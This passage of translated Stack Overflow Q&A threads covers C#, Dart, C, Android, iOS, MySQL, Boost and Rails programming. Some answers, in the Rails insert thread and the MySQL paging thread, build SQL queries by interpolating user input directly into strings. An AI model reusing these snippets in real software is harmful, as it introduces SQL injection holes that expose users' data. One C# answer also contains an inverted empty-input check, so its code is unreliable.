} 
```

对于后一种选项，用户需要先对控件进行子类化，然后才能使用它，如下所示：

```
public class MyConcreteControl : MyControl
{
    protected override void DoUpload(... parameters ...)
    {
        // User implements their own upload logic here...
    }
} 
```

# c# - 在 C# 中一次填充两个数组

> ID：13845493
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:41:12.387
> 
> 标签：c#, arrays

我无法从 do--while 循环中复制数据并在循环外重复它。这是在拆分功能期间，每个学生的考试成绩与他/她的名字在同一行输入。如果这是一个非常简单的问题，我很抱歉，但我找不到任何解决方法。非常感谢您的帮助。

```
 do {
        Console.Write("Enter the student's name followed by his/her score on the same line:");
        studentAndScore = Console.ReadLine();
        if (studentAndScore == "")
        {
            break;
        }
        string[] parsedInput;
        parsedInput = studentAndScore.Split();
            string student = parsedInput[0] = students[0];
            score = int.Parse(parsedInput[1]);
            score = studentScores[0];
        i++;
    } while (i<=MAX);
    Console.WriteLine("The test scores of the students are:");
    Console.WriteLine("students \t scores \t");
//And I need to repeat the list of student names and scores here 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:44:54.600

这行代码：

```
string student = parsedInput[0] = students[0]; 
```

将首先复制`students[0]`到`parsedInput[0]` *。* 因此，您正在丢失已解析的输入。

相反，请尝试：

```
string student = parsedInput[0];
students[0] = student; 
```

如果那是，事实上，你的意图。在同一行代码中执行两个任务很少是一个好主意。

很可能你真的想在你的索引器中使用，`i`而不是`0`在你的索引器中，比如在`parsedInput[i]`和`students[i]`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:52:09.327

只需创建两个列表...

```
var names = new List<String>();
var scores = new List<Int32>(); 
```

...将输入读入列表...

```
while (true)
{
    Console.Write("student/score: ");

    var input = Console.ReadLine();

    if (String.IsNullOrWhiteSpace(input))
    {
        var parts = input.Split();

        names.Add(parts[0]);
        scores.Add(Int32.Parse(parts[1]);
    }
    else
    {
         break;
    }
} 
```

...并输出列表。

```
for (var i = 0; i < names.Count; i++)
{
    Console.WriteLine("{0}\t{1}", names[i], scores[i]);
} 
```

当然还要添加很多错误处理。或者您可以使用字典，但我不太确定您获得的有关物品订购的保证。

```
var data = new Dictionary<String, Int32>();

while (true)
{
    Console.Write("student/score: ");

    var input = Console.ReadLine();

    if (String.IsNullOrWhiteSpace(input))
    {
        var parts = input.Split();

        data.Add(parts[0], Int32.Parse(parts[1]));
    }
    else
    {
         break;
    }
}

foreach (var entry in data)
{
    Console.WriteLine("{0}\t{1}", entry.Key, entry.Value);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:50:41.227

罗伯特写的是真的。此外，您不使用循环变量 i 将每个学生存储在数组的不同“插槽”中，因此您将覆盖当前位于同一位置的所有内容。并且数组的声明必须在循环之外，否则它会在每次迭代中擦除它。

总结您的 C# 代码示例所需的更改，更正后的版本如下所示：

```
void Main()
{   
    int MAX = 20;

    var students = new string[MAX];
    var scores = new int[MAX];

    int i=0;
    do {
        Console.Write("Enter the student's name followed by his/her score on the same line:");
        var studentAndScore = Console.ReadLine();
        if (studentAndScore == "")
        {
            break;
        }

        string[] parsedInput = studentAndScore.Split();     
        students[i] = parsedInput[0];       
        scores[i] = int.Parse(parsedInput[1]);

        i++;
    } while (i<MAX);
    Console.WriteLine("The test scores of the students are:");
    Console.WriteLine("students \t scores \t");
    for(int k=0; k<i; k++) {
        Console.WriteLine("Student: {0}, Score: {1}", students[k], scores[k]);
    }
} 
```

请注意，我`i`在`for`语句中使用的值而不是`MAX`，因为用户可以通过输入空行来跳出 do 循环。并且`i`始终包含先前输入的项目数。

当然，此代码尚不包含任何错误处理，这在现实世界中是必需的。

# dart - 获取当前操作系统的默认浏览器并用它打开网页？

> ID：13845498
> 
> 赞同：9
> 
> 时间：2012-12-12T17:41:21.980
> 
> 标签：dart

使用本地客户端应用程序，使用

```
import 'dart:io'; 
```

我看不出有办法加载消费者当前的默认浏览器，然后加载网页。（本地存储的 HTML 或网站）

我在[http://api.dartlang.org](http://api.dartlang.org)搜索了 API 文档，但没有找到简单的方法。

有没有办法做到这一点？最好类似于[java 中的 Desktop 类](http://docs.oracle.com/javase/6/docs/api/java/awt/Desktop.html)？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T20:38:05.733

我不认为有这样的功能。您可以填写[新功能请求](http://dartbug.com/new)。

如果您需要解决方法，您可以处理[Process](http://api.dartlang.org/docs/bleeding_edge/dart_io/Process.html)和[Platform](http://api.dartlang.org/docs/bleeding_edge/dart_io/Platform.html)类。

*   [在 Windows 上，您应该](http://social.msdn.microsoft.com/Forums/en-US/iewebdevelopment/thread/5bf91e62-7be9-4f1d-9bac-5b2a4dd8ced7/)能够使用`start ${url}`.
*   在 linux 上，你可以通过if is present来[做到这一点。](https://askubuntu.com/questions/19919/command-to-open-a-url)`xdg-open ${url}``xdg-open`
*   在其他情况下，应该有解决方案......

这是一个示例：

```
import 'dart:io';

main() {
  final url = "http://dartlang.org";
  if (Platform.operatingSystem == 'windows') {
    Process.run("start", [url]);
  } else if (Platform.operatingSystem == 'linux') {
    Process.run("xdg-open", [url]);
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-19T03:40:44.450

在 Windows 上，我发现`runInShell`需要设置标志：

```
Process.run("start", [url], runInShell: true); 
```

（至少在 Windows 7 上）。

我很惊讶有人没有创建一个包来可靠地调用所有平台上的默认浏览器。

# multithreading - .NET 4.0 BackgroundWorker 类和异常行为

> ID：13845503
> 
> 赞同：0
> 
> 时间：2012-12-12T17:41:27.170
> 
> 标签：multithreading, c#-4.0, backgroundworker

我在 backgroundworker 类中遇到了一些奇怪的行为，这让我相信我并不完全理解它是如何工作的。我假设以下代码部分或多或少是相同的，除了 BackgroundWorker 实现的一些额外功能（如进度报告等）：

第 1 节：

```
 void StartSeparateThread(){
        BackgroundWorker bw = new BackgroundWorker();
        bw.DoWork += new DoWorkEventHandler(bw_DoWork);
        bw.RunWorkerAsync();
    }

    void bw_DoWork(object sender, DoWorkEventArgs e)
    {
        //Execute some code asynchronous to the thread that owns the function
        //StartSeparateThread() but synchronous to itself.

        var SendCommand = "SomeCommandToSend";
        var toWaitFor = new List<string>(){"Various","Possible","Outputs to wait for"};
        var SecondsToWait = 30;

        //this calls a function that sends the command over the NetworkStream and waits
        //for various responses.
        var Result=SendAndWaitFor(SendCommand,toWaitFor,SecondsToWait);
    } 
```

第 2 节：

```
 void StartSeparateThread(){
        Thread pollThread = new Thread(new ThreadStart(DoStuff));
        pollThread.Start();
    }

    void DoStuff(object sender, DoWorkEventArgs e)
    {
        //Execute some code asynchronous to the thread that owns the function
        //StartSeparateThread() but synchronous to itself.

        var SendCommand = "SomeCommandToSend";
        var toWaitFor = new List<string>(){"Various","Possible","Outputs to wait for"};
        var SecondsToWait = 30;

        //this calls a function that sends the command over the NetworkStream and waits
        //for various responses.
        var Result=SendAndWaitFor(SendCommand,toWaitFor,SecondsToWait);
    } 
```

我正在使用第 1 节运行一些代码，这些代码通过网络流发送字符串并等待所需的响应字符串，并在此期间捕获所有输出。我编写了一个函数来执行此操作，该函数将返回网络流输出、发送字符串的索引以及所需响应字符串的索引。我看到了一些奇怪的行为，所以我将函数更改为仅在找到发送字符串和输出字符串时返回，并且找到的字符串的索引大于发送的字符串的索引。否则它将永远循环（仅用于测试）。我会发现该函数确实会返回，但两个字符串的索引都是 -1 并且输出字符串为空，或者有时填充了前一次调用的预期输出。如果我要猜测发生了什么，从 bw_DoWork() 函数内部调用的外部函数将与拥有 bw_DoWork() 函数的线程异步运行。结果，由于我的 SendAndWaitFor() 函数被连续多次调用。第二次调用将在第一次调用完成之前运行，在返回后覆盖第一次调用的结果，但在它们可以被评估之前。这似乎是有道理的，因为第一次调用总是会正确运行，而后续调用会显示上述奇怪的行为，但这似乎与 BackgroundWorker 类的行为方式背道而驰。此外，如果我在 SendAndWaitFor 函数内中断，事情会正常运行。这再次让我相信在 bwDoWork 函数本身中存在一些多线程。

当我将上面第一部分的代码更改为第二部分的代码时，事情完全按预期工作。那么，任何了解 BackgroundWorker 类的人都可以解释可能发生的情况吗？以下是一些可能相关的相关功能。

谢谢！

```
public Dictionary<string, string> SendAndWaitFor(string sendString, List<string> toWaitFor, int seconds)
    {
        var toReturn = new Dictionary<string, string>();
        var data = new List<byte>();
        var enc = new ASCIIEncoding();

        var output = "";
        var FoundString = "";

        //wait for current buffer to clear
        output = this.SynchronousRead();
        while(!string.IsNullOrEmpty(output)){
            output = SynchronousRead();
        }

        //output should be null at this point and the buffer should be clear.

        //send the desired data
        this.write(enc.GetBytes(sendString));

        //look for all desired strings until timeout is reached
        int sendIndex=-1;
        int foundIndex = -1;
        output += SynchronousRead();
        for (DateTime start = DateTime.Now; DateTime.Now - start < new TimeSpan(0, 0, seconds); )
        {
            //wait for a short period to allow the buffer to fill with new data              
            Thread.Sleep(300);

            //read the buffer and add it to the output
            output += SynchronousRead();
            foreach (var s in toWaitFor)
            {
                sendIndex = output.IndexOf(sendString);
                foundIndex = output.LastIndexOf(s);
                if (foundIndex>sendIndex)
                {
                    toReturn["sendIndex"] = sendIndex.ToString();
                    toReturn["foundIndex"] = sendIndex.ToString();
                    toReturn["Output"] = output;
                    toReturn["FoundString"] = s;
                    return toReturn;
                }
            }

        }
        //Set this to loop infinitely while debuging to make sure the function was only
        //returning above
        while(true){
        }
        toReturn["sendIndex"]="";
        toReturn["foundIndex"]="";
        toReturn["Output"] =output;
        toReturn["FoundString"] = "";
        return toReturn;
    }
    public void write(byte[] toWrite)
    {
        var enc = new ASCIIEncoding();
        var writeString = enc.GetString(toWrite);

        var ns = connection.GetStream();
        ns.Write(toWrite, 0, toWrite.Length);
    }

 public string SynchronousRead()
    {
        string toReturn = "";
        ASCIIEncoding enc = new ASCIIEncoding();
        var ns = connection.GetStream();

        var sb = new StringBuilder();
        while (ns.DataAvailable)
        {
            var buffer = new byte[4096];
            var numberOfBytesRead = ns.Read(buffer, 0, buffer.Length);
            sb.AppendFormat("{0}", Encoding.ASCII.GetString(buffer, 0, numberOfBytesRead));
            toReturn += sb.ToString();
         }         

        return toReturn;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:22:49.927

后台工作人员要使用的所有数据都应通过 DoWorkEventArgs 传递，并且不应从类（或 GUI 界面）中提取任何内容。

在查看您的代码时，我无法确定创建属性（？）连接的位置。我的猜测是，连接是在不同的线程上创建的，或者可能是从 GUI（？）中提取*读取*信息，其中任何一个都可能导致问题。

我建议您在 dowork 事件中创建连接实例，而不是从不同的线程中拉出现有的连接实例。还要验证数据连接是否可以访问 GUI 之外的任何信息，但它的信息是按其制作的方式传入的。

[我在我的博客C# WPF: Linq Fails in BackgroundWorker DoWork Event](http://omegacoder.com/?p=636)上讨论了后台工作人员的一个问题，这可能会告诉你问题出在你的代码中。

# c - printf 行为怪异

> ID：13845505
> 
> 赞同：2
> 
> 时间：2012-12-12T17:41:34.913
> 
> 标签：c, printf

我有一个简单的程序，它应该打印一个字符串。但我没有得到预期的输出。谁能告诉我程序有什么问题？

这是我的代码：

```
main()
{
   char arr[] = "Test_string";
   printf("%20s"+1,arr);
   return 0;
}

output: 20s 
```

预期输出为：`Test_string`

`"Test_string"`正如我们`"%20s"`作为格式说明符提供的那样，在 20 个地方打印。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T17:43:13.263

如果您仔细查看您的`printf`电话，这非常简单。

这是[printf](http://linux.die.net/man/3/printf)的原型：`int printf(const char *format, ...);`。

`printf`需要一个指向格式化字符串的指针作为第一个参数。在您的程序中，您传递了一个指向此字符串的指针：`"20s"`并`printf`立即打印您传递的内容。

让我解释一下为什么传递的指针指向`"20s"`而不是`"%20s"`。

~~C 中带引号的字符串被解释为字符指针。~~ 字符数组，当传递给函数时，会衰减为指针。

`printf("%20s",arr);`相当于：

```
const char * ptr = "%20s";
printf(ptr,arr); 
```

同样`printf("%20s"+1,arr);`等价于：

```
const char * ptr = "%20s";
printf(ptr+1,arr); 
```

因为您正在传递`"%20s"+1`，所以传递给 printf 的实际指针指向一个字符串`"20s"`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T17:43:31.300

删除格式字符串旁边的 +1

```
printf("%20s",arr); 
```

# android - 如何将点击项目的位置值作为 Intent Extra 发送？

> ID：13845506
> 
> 赞同：1
> 
> 时间：2012-12-12T17:41:35.940
> 
> 标签：android, android-intent, onclick

我有两个活动，`Activity1 extends ListActivity`和`Activity2`。我用我自己的适配器`ListActivity`。我想`Activity2`在单击列表项之一时启动。中有一个`ImageView1`。`Activity2`当我单击 中的第一项时`ListActivity`，我想将位于可绘制文件夹中的 FirstImage 设置`ImageView1`为`Activity2`。当我单击中的第二个项目时`ListActivity`，我想将位于可绘制文件夹中的 SecondImage 替换为 ImageView1。因此，我需要将点击项目的位置值作为 Intent Extra 发送。我对发送位置值感到困惑。我也想用 Switch-Case 来写。有人给我解释一下吗？我绝对是初学者。谢谢

Home.java (活动1)

```
public class Home extends ListActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.home);
        String [] items = new String []{"Banana","Apple","Orange","Pineapple","Lime","Papaya","Mango"};
        CustomAdapter adapter = new CustomAdapter(this, items);
        setListAdapter(adapter);

    }

    @Override
    protected void onListItemClick(ListView l, View v, int position, long id) {
        // TODO Auto-generated method stub
        super.onListItemClick(l, v, position, id);
        //Toast.makeText(this, "You touched"+position, Toast.LENGTH_SHORT).show();

    } 
```

CustomAdapter.java

```
public class CustomAdapter extends ArrayAdapter<String> {

    private Context context;
    private String [] objects;

    public CustomAdapter (Context context, String []objects){
        super(context,R.layout.row, objects);
        this.context=context;
        this.objects=objects;

    }
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        // TODO Auto-generated method stub
        //return super.getView(position, convertView, parent);
        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View rowView = inflater.inflate(R.layout.row, parent, false);

        TextView tv= (TextView) rowView.findViewById(R.id.textView1);
        ImageView iv= (ImageView) rowView.findViewById(R.id.imageView1);

        tv.setText(objects[position]);
        if (objects[position].startsWith("Apple")) {
            iv.setImageResource(R.drawable.apple);
        }
        else if (objects[position].startsWith("Banana")) {
            iv.setImageResource(R.drawable.banana);

        }
        else if (objects[position].startsWith("Lime")) {
            iv.setImageResource(R.drawable.lime);
        }
        else if (objects[position].startsWith("Mango")) {
            iv.setImageResource(R.drawable.mango);
        }
        else if (objects[position].startsWith("Orange")) {
            iv.setImageResource(R.drawable.orange);
        }
        else if (objects[position].startsWith("Papaya")) {
            iv.setImageResource(R.drawable.papaya);
        }
        else {
            iv.setImageResource(R.drawable.pineapple);
        }

        return rowView;
    }

} 
```

Activity2 只有一个 ImageView

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:48:54.167

您可以使用`Intent`. 假设您覆盖`OnListItemClick`并在其中开始`Activtity2`

```
 protected void onListItemClick(ListView l, View v, int position, long id) {
    Intent intent = new Intent(this, Activity2.class);
    intent.putExtra("pos", position);
    startActivity(intent)
  } 
```

在Activity2中`onCreate`使用`getIntent();`

```
public void onCreate(Bundle savedInstanceState) {
  int position = getIntent().getIntExtra("pos", 0);

} 
```

# ios - 是否可以手动执行 Popover Segue（从动态 UITableView 单元格）？

> ID：13845508
> 
> 赞同：30
> 
> 时间：2012-12-12T17:41:40.930
> 
> 标签：ios, uipopovercontroller, segue

当用户触摸动态 TableView 中的单元格时，我需要执行 Popover segue。但是当我尝试使用此代码执行此操作时：

```
- (void)tableView:(UITableView *)tableview didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
        [self performSegueWithIdentifier:@"toThePopover" sender:[tableView cellForRowAtIndexPath]];
    //...
} 
```

比我得到一个错误：

非法配置

> Popover segue 没有锚点

有什么方法可以做到这一点（手动从动态 TableView 执行弹出框转场）？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2013-01-25T03:24:24.343

今晚我遇到了同样的问题，有几个解决方法（包括以老式方式呈现弹出框）。

对于此示例，我有一个对象存储在我的自定义单元类中。当单元格被选中时，我调用这样的函数来打开 popOverViewController 中关于对象的详细信息，并指向（锚点）它在表格中的相应单元格。

```
 - (void)openCustomPopOverForIndexPath:(NSIndexPath *)indexPath{
        CustomViewController* customView = [[self storyboard] instantiateViewControllerWithIdentifier:@"CustomViewController"];

        self.myPopOver = [[UIPopoverController alloc]
                                   initWithContentViewController:customView];
        self.myPopOver.delegate = self;
        //Get the cell from your table that presents the popover
        MyCell *myCell = (MyCell*)[self.tableView cellForRowAtIndexPath:indexPath];
        CGRect displayFrom = CGRectMake(myCell.frame.origin.x + myCell.frame.size.width, myCell.center.y + self.tableView.frame.origin.y - self.tableView.contentOffset.y, 1, 1);
        [self.myPopOver presentPopoverFromRect:displayFrom
                                             inView:self.view permittedArrowDirections:UIPopoverArrowDirectionLeft animated:YES];
    } 
```

这种方法的问题是我们经常需要弹出视图有一个自定义的初始化器。如果您希望在情节提要而不是 xib 中设计视图并且有一个自定义 init 方法将您的单元格关联对象作为参数用于它的显示，那么这是有问题的。您也不能只使用 popover segue（乍一看），因为您需要一个动态锚点（并且您不能锚定到单元原型）。所以这就是我所做的：

1.  首先，在您的视图控制器视图中创建一个隐藏的 1px X 1px UIButton。（重要的是要给出允许它在视图中移动的任何地方的按钮约束）
2.  然后在您的视图控制器中为按钮（我称为 popOverAnchorButton）制作一个插座，并控制将一个 segue 从隐藏按钮拖动到您希望 segue 的视图控制器。让它成为一个popOver segue。

现在你有了一个带有“合法”锚的弹出框segue。该按钮是隐藏的，因此任何人都不会意外触摸它。您仅将其用于锚点。

现在只需像这样在您的函数中手动调用您的 segue。

```
 - (void)openCustomPopOverForIndexPath:(NSIndexPath *)indexPath{
        //Get the cell from your table that presents the popover
        MyCell *myCell = (MyCell*)[self.tableView cellForRowAtIndexPath:indexPath];

        //Make the rect you want the popover to point at.
        CGRect displayFrom = CGRectMake(myCell.frame.origin.x + myCell.frame.size.width, myCell.center.y + self.tableView.frame.origin.y - self.tableView.contentOffset.y, 1, 1);

        //Now move your anchor button to this location (again, make sure you made your constraints allow this)
        self.popOverAnchorButton.frame = displayFrom;
        [self performSegueWithIdentifier:@"CustomPopoverSegue" sender:myCell];
    } 
```

还有……瞧。现在，您正在使用 segues 的所有伟大之处的魔力，并且您拥有一个似乎指向您的单元格的动态锚点。现在`-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender`您可以简单地将发件人转换为您的单元格的类（假设您对发件人类型和正在调用的segue 进行了适当的检查）并将segue 的destinationViewController 提供给单元格的对象。

让我知道这是否有帮助，或者任何人有任何反馈或改进。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-06-30T14:58:57.543

只需添加此答案作为从触摸单元格呈现弹出窗口的替代方法，尽管它使用代码而不是 segue。虽然它非常简单，并且从 iOS 4 到 iOS 7 都适用于我：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    [tableView deselectRowAtIndexPath:indexPath animated:NO];

    //get the data of the row they clicked from the array
    Url* clickedRec = [self.resultsArray objectAtIndex:indexPath.row];

    //hide the popover in case it was already opened from a previous touch.    
    if (self.addNewPopover.popoverVisible) {
            [self.addNewPopover dismissPopoverAnimated:YES];
            return;
        }

    //instantiate a view controller from the storyboard
    AddUrlViewController *viewControllerForPopover =
    [self.storyboard instantiateViewControllerWithIdentifier:@"addUrlPopup"];

    //set myself as the delegate so I can respond to the cancel and save touches.
    viewControllerForPopover.delegate=self;
    //Tell the view controller that this is a record edit, not an add        
    viewControllerForPopover.addOrEdit = @"Edit";
    //Pass the record data to the view controller so it can fill in the controls            
    viewControllerForPopover.existingUrlRecord = clickedRec;

    UIPopoverController *popController = [[UIPopoverController alloc]
                                          initWithContentViewController:viewControllerForPopover];

    //keep a reference to the popover since I'm its delegate        
    self.addNewPopover = popController;

    //Get the cell that was clicked in the table. The popover's arrow will point to this cell since it was the one that was touched.
    UITableViewCell *clickedCell = [self.tableView cellForRowAtIndexPath:indexPath];

    //present the popover from this cell's frame.
    [self.addNewPopover presentPopoverFromRect:clickedCell.frame inView:self.myTableView permittedArrowDirections:UIPopoverArrowDirectionAny animated:YES];
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-08-03T07:22:22.350

使用 popoverPresentationController 快速回答：使用情节提要，设置新的视图控制器，情节提要 ID 为 popoverEdit。

```
override func tableView(tableView: UITableView, didSelectRowAtIndexPath indexPath: NSIndexPath) {

    let fromRect:CGRect = self.tableView.rectForRowAtIndexPath(indexPath)

    let popoverVC = storyboard?.instantiateViewControllerWithIdentifier("popoverEdit") as! UIViewController
    popoverVC.modalPresentationStyle = .Popover
    presentViewController(popoverVC, animated: true, completion: nil)
    let popoverController = popoverVC.popoverPresentationController
    popoverController!.sourceView = self.view
    popoverController!.sourceRect = fromRect
    popoverController!.permittedArrowDirections = .Any

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-05-18T08:41:56.937

我以最简单的方式做到了这一点：

1.  像往常一样在 Storyboard 中制作这个 Popover Presentation Segue，但从 ViewController 拖动（不是按钮）
2.  选择锚视图作为表格视图
3.  然后在表格视图单元格的按钮触摸中：

    ```
     private func presentCleaningDateDatePicker(from button: UIButton) {
        performSegue(withIdentifier: "Date Picker Popover Segue", sender: button)
    } 
    ```

4.  并实现 prepare(for segue) 方法

    ```
     override func prepare(for segue: UIStoryboardSegue, sender: Any?) {

        if let identifier = segue.identifier {
            switch identifier {
            case "Date Picker Popover Segue":

                if let vc = segue.destination as? DatePickerViewController {
                    if let ppc = vc.popoverPresentationController {
                        ppc.sourceView = sender as! UIButton
                        ppc.sourceRect = (sender as! UIButton).frame
                        ppc.delegate = vc

                        vc.minimumDate = Date()
                        vc.maximumDate = Date().addMonth(n: 3)
                        vc.delegate = self
                    }
                }
            default:
                break
            }
        }
    } 
    ```

# mysql - 在 MySQL 查询中返回匹配结果的子集

> ID：13845509
> 
> 赞同：1
> 
> 时间：2012-12-12T17:41:45.303
> 
> 标签：mysql, search

我有一个包含元素和关键字的 MySQL 数据库。如果有人按关键字搜索元素，他们可能会获得大量点击。与其返回所有匹配的元素，我想做相当于返回第 n 组 m 个元素。这将允许我显示前 m 个匹配元素，然后获取并显示接下来的 m 个匹配元素，等等。

作为一个具体的例子，假设我有一个图像数据库，我使用关键字“ball”进行搜索，总共有 500 个匹配项，我想查询数据库以返回前 50 个，然后是第二个 50，等等。假设元素的顺序是确定的（使用 ORDER BY），我不知道如何子选择这些匹配元素的子集。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:46:29.043

您可以在查询中添加 LIMIT 条件，它允许您指定结果数量和结果偏移量。

例子：

```
SELECT * FROM table WHERE keyword = 'ball' LIMIT 0, 50 
```

这将为您提供从结果偏移量 0 开始的前 50 个结果。

要获得下一个 50，您只需将其更改为：

```
SELECT * FROM table WHERE keyword = 'ball' LIMIT 50, 50 
```

从结果偏移量 50 开始，它会为您提供 50 个结果。

通常，当您编码分页（提供结果集的第 1、2、3 页）时，您会在 URL 中传递要开始的偏移量，以便运行相同的查询但从不同的偏移量开始获得结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:58:15.730

```
SELECT keyword, otherfield from table
WHERE keyword LIKE '$keywordvar%'
ORDER BY whatever ASC 
```

然后，使用[LIMIT 子句](http://dev.mysql.com/doc/refman/5.5/en/select.html)：

要将您的查询限制为前 50 个，请使用：

```
LIMIT 50; 
```

要将您的查询限制为第二个 50，请使用：

```
LIMIT 50, 50; 
```

要将您的查询限制为第三个 50，请使用：

```
LIMIT 100, 50; 
```

您可以将值更改为更大或更小的集合。您的最终查询将类似于：

```
SELECT keyword, otherfield from table
WHERE keyword LIKE '$keywordvar%'
ORDER BY whatever ASC
LIMIT 50; 
```

或者，如果您不使用通配符搜索并寻找特定的关键字值：

```
SELECT keyword, otherfield from table
WHERE keyword = 'ball'
ORDER BY whatever ASC
LIMIT 50; 
```

# c++ - Boost d_ary_heap/priority_queue 编译错误：已删除函数

> ID：13845511
> 
> 赞同：0
> 
> 时间：2012-12-12T17:41:49.387
> 
> 标签：c++, c++11, queue, heap, dijkstra

我正在使用 Dijkstra 在图中找到最短路径。我曾经使用 std::set 但我认为堆可以表现得更好。但是我在使用 d_ary_heap 或 priority_queue 时遇到了麻烦。这是一个简化版本：

```
#include <string>
#include <inttypes.h> // for uint32_t
#include <boost/heap/fibonacci_heap.hpp>
#include <boost/heap/binomial_heap.hpp>
#include <boost/heap/d_ary_heap.hpp>
#include <boost/heap/priority_queue.hpp>

using namespace std;

struct __attribute__ ((__packed__)) __attribute__((aligned(8)) Cmp {
    // Do *not* reorder the following two fields or comparison will break.
    const int32_t _id;
    const float _cost;

    Cmp(int32_t id, float cost) : _id(id), _cost(cost) {
        } 
};

struct Entry {
    Cmp _cmp;
    string str = "some variable";

    Entry(int32_t id, float cost) : _cmp(id, cost) {}
    Entry(Entry &&e) : _cmp(e._cmp._id, e._cmp._cost) {}
    Entry(const Entry &e) : _cmp(e._cmp._id, e._cmp._cost) {}
};

template<class T>
struct gt_entry: public binary_function <T, T, bool>
{
    bool operator()(const T &l, const T &r) const
    {
        return *(int64_t const *)&l > *(int64_t const *)&r;
    }
};

typedef boost::heap::d_ary_heap<
    Entry,
    boost::heap::arity<2>,
    boost::heap::compare<gt_entry<Entry> > > DHeap;

typedef boost::heap::binomial_heap<
    Entry,
    boost::heap::compare<gt_entry<Entry> > > BHeap;

typedef boost::heap::fibonacci_heap<
    Entry,
    boost::heap::compare<gt_entry<Entry> > > FHeap;

typedef boost::heap::priority_queue<
    Entry,
    boost::heap::compare<gt_entry<Entry> > > PQueue;

int main() {
    //DHeap h; // Doesn't compile
    //PQueue h; // Doesn't compile
    //BHeap h; // Works but slower than FHeap
    FHeap h; // Works but only  3% performance increase vs std::set

    h.push(Entry(1, 500.1));
    h.top();
    h.pop();

    return 0;
} 
```

（我正在使用 _cost 和 _id 的封装来加快比较，如果您有兴趣，请参阅[C++ 优化 if/else 条件。）](https://stackoverflow.com/questions/13832424/c-optimize-if-else-condition)

这似乎是相关的错误行，我猜它与移动或复制构造函数有关。

```
.../move.h:177:7: error: use of deleted function ‘Entry& Entry::operator=(const Entry&)’
heaps.cpp:19:8: note: ‘Entry& Entry::operator=(const Entry&)’ is implicitly declared as deleted because ‘Entry’ declares a move constructor or move assignment operator 
```

我正在使用 gcc 4.6 (-std=c++0x) 和 boost 1.50。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:47:12.773

您的 gcc 版本没有正确实现隐式删除函数的规则。该代码至少适用于 gcc 4.7。

一个快速的解决方法是同时声明移动赋值运算符`Entry& operator=(Entry&&)`。

一般来说，我不建议使用`C++11`不是完全最新的编译器。

另外：您移动构造函数和复制构造函数的行为很奇怪。他们不复制/移动字符串。你可能想改变它。如果您真的只需要一个字符串，请将其设为静态成员。

# database - 如何在 ruby on rails 中编写插入语句？

> ID：13845514
> 
> 赞同：1
> 
> 时间：2012-12-12T17:41:53.103
> 
> 标签：database, ruby-on-rails-3, updating, insert-query

我在 ruby​​ on rails 上运行插入语句。但是失败了。这是代码：

```
class BookmarkController < ApplicationController
  def index

    if request.post?
    @user_new = Bookmark.new(params[:user_new])
    tags = @user_new.tags.split(",")
    @user_new = Bookmark.new(params[:user_new])
    query = "INSERT INTO bookmark (title , url, tags) VALUES (#{@user_new.title}, #{@user_new.url}, #{tags[0]})  "

    Bookmark.connection.execute(query);

    end   

  end 
```

但输出是：

```
ActiveRecord::StatementInvalid in BookmarkController#index

SQLite3::SQLException: near ".": syntax error: INSERT INTO bookmark (title , url, tags) VALUES (abhir, www.mrabhiram.tumblr.com, tumblr) 
```

谁能建议我使用 SQL 插入语句插入记录的正确方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-31T06:48:58.193

你可以写

```
 MOdel.connection.insert("INSERT INTO table_name(fields) VALUES('value')") 
```

它正在工作...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:04:15.820

假设`Bookmark`是 的子类`ActiveRecord`，AR 将为您保存这个 - 无需编写自定义 SQL - 该`save`方法会处理这个问题。[您可以在此处](http://guides.rubyonrails.org/active_record_querying.html)阅读有关相关 ActiveRecord 功能的更多信息

```
class BookmarkController < ApplicationController
  def index

    if request.post?
    @user_new = Bookmark.new(params[:user_new])
    tags = @user_new.tags.split(",")
    @user_new = Bookmark.new(params[:user_new])
    #query = "INSERT INTO bookmark (title , url, tags) VALUES (#{@user_new.title}, #{@user_new.url}, #{tags[0]})  "

    #Bookmark.connection.execute(query);
    # The save method will insert the record into the database.
    @user_new.save()    

    end   

  end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:45:41.943

您需要在“价值”数据上加上引号。就像是：

```
query = "INSERT INTO bookmark (title , url, tags) VALUES ('#{@user_new.title}', '#{@user_new.url}', '#{tags[0]}')  " 
```

# c# - 打开以编程方式编译的程序时出现控制台

> ID：13845519
> 
> 赞同：0
> 
> 时间：2012-12-12T17:42:04.923
> 
> 标签：c#, compilation

我有一个程序，它编译一个应用程序。它创建的应用程序应该隐藏在背景中或不可见。

这就是我为应该在 bg 中的应用程序所拥有的：

```
this.ShowIcon = false;
this.ShowInTaskbar = false;
this.Visible = false;
this.WindowState = System.Windows.Forms.FormWindowState.Normal; 
```

在我的程序创建它之后，我出于某种原因打开它。将打开一个命令提示符，并且该表单清晰可见。

此外，如果我创建一个空项目并将源代码放在那里并运行它，它也可以正常工作

